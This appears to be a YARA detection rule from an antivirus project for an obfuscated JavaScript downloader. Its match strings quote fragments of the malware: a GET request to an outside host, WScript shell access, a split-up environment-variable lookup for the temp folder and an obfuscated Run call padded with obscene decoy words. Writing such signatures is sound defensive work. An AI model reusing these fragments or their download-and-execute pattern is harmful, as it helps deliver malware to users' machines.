rule sig_20160428_98e295b1c16a2bc8b4581df96ccae143 {
  meta:
    description = "datamaliciousorder - file 20160428_98e295b1c16a2bc8b4581df96ccae143.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "88b25cb50deb59be3b75fdd9ae697b920a08409ddf0c1f686e972db9288aab55"

  strings:
    $s1  = "YldEutOidOpgSwkTwpNae[WamVprScmTqcHhqIcaNss](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "return WhqFsbCiyGqnLrxClzCtp - NiyVebNcbPylOwrFiiMmk;};" fullword ascii
    $s3  = "function EyqAmvIplWboRgfRqkLhu(WhqFsbCiyGqnLrxClzCtp, NiyVebNcbPylOwrFiiMmk){YohHubRolMpxYhpGduRbd = YohHubRolMpxYhpGduRbd * 1; " ascii
    $s4  = "var WphQqbLplRgmIaaWeyDev = this[\"WScript\"];" fullword ascii
    $s5  = "function QkdGgvJyyDsdGuhGijJuy(AfeWidYyvGeaRwdOauCku){TrtGhcAimVldGtqSvmSak[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function BnhTnyFqdIbbYuvZobScv() {return TrtGhcAimVldGtqSvmSak[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "function QkdGgvJyyDsdGuhGijJuy(AfeWidYyvGeaRwdOauCku){TrtGhcAimVldGtqSvmSak[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "if (YldEutOidOpgSwkTwpNae[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "var TrtGhcAimVldGtqSvmSak = function VknCobZmfEbgZwqGdhQeh() {return WphQqbLplRgmIaaWeyDev[HslAhpViyTtoBieMtoXwm](\"WScript\"+\"" ascii
    $s10 = "function ElgSmiVyhRmcWtoAdoByh(){return UoxHkiOnxRbkLfwYfsLrh + \"\";};" fullword ascii
    $s11 = "function EyqAmvIplWboRgfRqkLhu(WhqFsbCiyGqnLrxClzCtp, NiyVebNcbPylOwrFiiMmk){YohHubRolMpxYhpGduRbd = YohHubRolMpxYhpGduRbd * 1; " ascii
    $s12 = "function UvoKepZeyDrkHijZjoMvo() {return ((HaqWnyJwcKgsMvbQfhHfg == true) && (HaqWnyJwcKgsMvbQfhHfg == GpuKyzQpaSigDjmWsfLfr)) ?" ascii
    $s13 = "function UvoKepZeyDrkHijZjoMvo() {return ((HaqWnyJwcKgsMvbQfhHfg == true) && (HaqWnyJwcKgsMvbQfhHfg == GpuKyzQpaSigDjmWsfLfr)) ?" ascii
    $s14 = "var TrtGhcAimVldGtqSvmSak = function VknCobZmfEbgZwqGdhQeh() {return WphQqbLplRgmIaaWeyDev[HslAhpViyTtoBieMtoXwm](\"WScript\"+\"" ascii
    $s15 = "function BnhTnyFqdIbbYuvZobScv() {return TrtGhcAimVldGtqSvmSak[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s16 = "function BhcSjbPkqFbwHujUkwYin(){return HslAhpViyTtoBieMtoXwm;};" fullword ascii
    $s17 = "function CicTnhWpfWcjLifBbcHyc(){return 23;};" fullword ascii
    $s18 = "var GpuKyzQpaSigDjmWsfLfr = false;" fullword ascii
    $s19 = "function CreXaeOeqHwqNlqUltKrz()" fullword ascii
    $s20 = "return EyqAmvIplWboRgfRqkLhu(1 == 1 ? QapNbvNcdIhyNrgQouNrx : 0, 1 == 1 ? YxiVzzMfqOkiWltCctDuh : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}